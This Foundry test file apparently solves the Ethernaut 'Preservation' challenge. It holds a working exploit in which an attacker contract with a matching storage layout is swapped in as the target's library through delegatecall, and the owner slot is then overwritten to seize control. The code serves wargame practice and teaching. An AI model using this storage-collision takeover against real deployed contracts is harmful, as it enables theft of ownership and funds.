// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract PreservationAttack {
  bytes32 internal slot0;
  bytes32 internal slot1;
  bytes32 internal owner; // slot3
  address internal challengeAddress; // needed by us

  constructor(address _challengeAddress) {
    challengeAddress = _challengeAddress;
  }

  function setTime(uint256 _input) public {
    owner = bytes32(_input);
  }
}

contract PreservationTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC);
  }

  function testExploit() public {
    bool success;
    uint256 data;
    PreservationAttack attackContract = new PreservationAttack(challengeAddress);

    // switch timeZone1Library with our contract
    data = uint256(uint160(address(attackContract)));

    (success,) = challengeAddress.call(abi.encodeWithSignature("setFirstTime(uint256)", data));
    success;

    // invoke again, this time we'll go through our PreservationAttack contract
    data = uint256(uint160(address(address(this))));
    (success,) = challengeAddress.call(abi.encodeWithSignature("setFirstTime(uint256)", data));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
